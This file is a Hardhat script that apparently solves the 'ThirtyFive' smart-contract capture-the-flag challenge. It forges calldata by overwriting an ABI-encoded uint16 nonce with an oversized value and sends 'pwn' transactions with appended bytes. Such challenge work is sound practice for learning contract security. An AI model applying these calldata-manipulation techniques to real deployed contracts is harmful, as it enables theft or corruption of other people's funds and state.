import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";
import { ThirtyFive } from "../typechain";

task("solveThirtyFive", "Solves the ThirtyFive challenge")
    .addParam("thirtyFiveAddress", "Address of the exploitable contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (hre.network.config.chainId === undefined) {
            throw new Error("Chain ID is not defined");
        }
        if (!hre.ethers.utils.isAddress(args.thirtyFiveAddress)) {
            throw new Error(`Invalid contract address format: ${args.thirtyFiveAddress}`);
        }

        const ThirtyFiveFactory = await hre.ethers.getContractFactory("ThirtyFive");
        const thirtyFiveChallenge = (await ThirtyFiveFactory.attach(args.thirtyFiveAddress)) as ThirtyFive;

        const signers = await hre.ethers.getSigners();
        const signer = signers[0];

        console.log("Sending signature and setting nonce up...");
        await signItLikeYouMeanIt(hre, thirtyFiveChallenge, signer, 1, hre.network.config.chainId);

        console.log("Requesting token...");
        const token = await giveMeMyToken(hre, thirtyFiveChallenge, signer);

        console.log("...token received: ", token);

        console.log("Sending first pwn...");
        await pwn(hre, thirtyFiveChallenge, signer, token);

        console.log("Sending second pwn...");
        await pwn(hre, thirtyFiveChallenge, signer, token, "01");

        console.log("Sending third pwn...");
        await pwn(hre, thirtyFiveChallenge, signer, token, "02");

        const result = await thirtyFiveChallenge.HackerWho();

        console.log("[RESULT]:", result);
    });

async function pwn(
    hre: HardhatRuntimeEnvironment,
    thirtyFiveChallenge: ThirtyFive,
    signer: SignerWithAddress,
    token: string,
    extraData?: string,
) {
    const pwnABI = ["function pwn(bytes32 token)"];
    const pwnIFace = new hre.ethers.utils.Interface(pwnABI);

    let encodedData = pwnIFace.encodeFunctionData("pwn", [token]);

    if (extraData) {
        encodedData += extraData;
    }

    const tx = await signer.sendTransaction({
        to: thirtyFiveChallenge.address,
        data: encodedData,
    });
    return tx.wait();
}

async function giveMeMyToken(
    hre: HardhatRuntimeEnvironment,
    thirtyFiveChallenge: ThirtyFive,
    signer: SignerWithAddress,
) {
    const tx = await thirtyFiveChallenge.giveMeMyToken();
    await tx.wait();

    const filter = thirtyFiveChallenge.filters.TokenGen(signer.address);
    const events = await hre.ethers.provider.getLogs(filter);
    const token = events[0].topics[2];
    return token;
}

async function signItLikeYouMeanIt(
    hre: HardhatRuntimeEnvironment,
    thirtyFiveChallenge: ThirtyFive,
    signer: SignerWithAddress,
    nonce: number,
    chainId: number,
) {
    const domain = {
        name: "ThirtyFive",
        version: "1337",
        chainId: chainId,
        verifyingContract: thirtyFiveChallenge.address,
    };

    // The named list of all type definitions
    const types = {
        SIGNING: [
            { name: "nonce", type: "uint16" },
            { name: "expiry", type: "uint256" },
        ],
    };

    // The data to sign
    const value = {
        nonce: nonce,
        expiry: hre.ethers.constants.MaxUint256,
    };

    const signature = await signer._signTypedData(domain, types, value);

    // Create custom encoded data
    const signItLikeYouMeanItABI = [
        "function signItLikeYouMeanIt(uint16 nonce, uint256 deadline, bytes memory signature)",
    ];
    const signItLikeYouMeanItIFace = new hre.ethers.utils.Interface(signItLikeYouMeanItABI);

    const encodedData = signItLikeYouMeanItIFace.encodeFunctionData("signItLikeYouMeanIt", [
        nonce,
        value.expiry,
        signature,
    ]);

    // The trick is that the nonce being an uint16 is actually encoded as a uint256. We will take
    // advantage of that to pass a bigger value that will be set into the nonces map
    const fixedEncodedData =
        encodedData.substring(0, 10) +
        "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" +
        encodedData.substring(70);

    const tx = await signer.sendTransaction({
        to: thirtyFiveChallenge.address,
        data: fixedEncodedData,
    });
    return tx.wait();
}
